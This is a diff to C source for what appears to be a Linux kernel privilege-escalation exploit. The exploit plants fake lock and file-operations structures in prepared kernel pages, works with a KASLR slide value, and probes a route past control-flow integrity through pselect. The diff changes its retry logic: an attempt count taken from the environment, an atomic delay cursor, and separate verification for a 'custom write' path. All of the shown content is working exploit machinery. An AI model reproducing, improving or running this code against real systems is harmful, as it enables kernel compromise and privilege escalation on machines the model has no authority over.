@@ -9,6 +9,7 @@ static double fops_elapsed_ms(struct timespec *ref) {
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
+#define PSELECT_CUSTOM_ROUTE_ATTEMPTS 16
 #define PSELECT_EXPECTED_READY 9
 
 atomic_int cfi_stage_done;
@@ -42,6 +43,7 @@ uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
+static atomic_int pselect_delay_cursor;
 
 static int route_delay_usec(int attempt) {
   int override = env_int_range("PSELECT_ROUTE_DELAY_USEC", -1, -1, 1000000);
@@ -54,7 +56,11 @@ static int route_delay_usec(int attempt) {
   };
 
   int count = (int)(sizeof(delays) / sizeof(delays[0]));
-  return delays[(attempt - 1) % count];
+  int idx = attempt - 1;
+  if (pselect_custom_write_enabled()) {
+    idx = atomic_fetch_add(&pselect_delay_cursor, 1);
+  }
+  return delays[idx % count];
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -174,8 +180,11 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
-  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
-       route_attempt++) {
+  int default_attempts = pselect_custom_write_enabled()
+    ? PSELECT_CUSTOM_ROUTE_ATTEMPTS : PSELECT_CFI_ROUTE_ATTEMPTS;
+  int route_attempts =
+    env_int_range("PSELECT_ROUTE_ATTEMPTS", default_attempts, 1, 64);
+  for (int route_attempt = 1; route_attempt <= route_attempts; route_attempt++) {
     if (route_attempt != 1) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
       if (!page_base || !fake_lock || !fake_fops) {
@@ -263,30 +272,39 @@ void do_pselect_fake_lock_route(void) {
     int route_signal = calls > 0 && success > 0;
     int cfi_probed = 0;
     if (route_signal) {
-      cfi_probed = 1;
-      if (ret != PSELECT_EXPECTED_READY) {
-        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
-                route_attempt, ret, PSELECT_EXPECTED_READY);
-      }
       if (pselect_custom_write_enabled()) {
-        cfi_last_step = 0;
-        cfi_last_errno = 0;
-        route_verified = 1;
-      } else if (try_cfi_stage()) {
-        cfi_last_step = 0;
-        route_verified = 1;
-      } else if (!cfi_last_step) {
-        cfi_last_step = 32;
+        if (ret == PSELECT_EXPECTED_READY) {
+          cfi_last_step = 0;
+          cfi_last_errno = 0;
+          route_verified = 1;
+        } else {
+          cfi_last_step = 32;
+          cfi_last_errno = saved_errno;
+          pr_info("pselect custom write miss attempt=%d ret=%d expected=%d\n",
+                  route_attempt, ret, PSELECT_EXPECTED_READY);
+        }
+      } else {
+        cfi_probed = 1;
+        if (ret != PSELECT_EXPECTED_READY) {
+          pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
+                  route_attempt, ret, PSELECT_EXPECTED_READY);
+        }
+        if (try_cfi_stage()) {
+          cfi_last_step = 0;
+          route_verified = 1;
+        } else if (!cfi_last_step) {
+          cfi_last_step = 32;
+        }
       }
     }
     if (!route_verified && route_signal) {
       route_quality_miss = 1;
-      if (!cfi_probed) {
+      if (!cfi_probed && !cfi_last_step) {
         cfi_last_step = 35;
         cfi_last_errno = saved_errno;
       }
       pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
-              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
+              route_attempt, route_attempts, ret,
               PSELECT_EXPECTED_READY, delay_usec);
     } else if (!route_verified) {
       cfi_last_step = 33;
@@ -307,7 +325,7 @@ void do_pselect_fake_lock_route(void) {
       break;
     }
     pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
-            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
+            route_attempt, route_attempts, cfi_last_errno);
   }
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
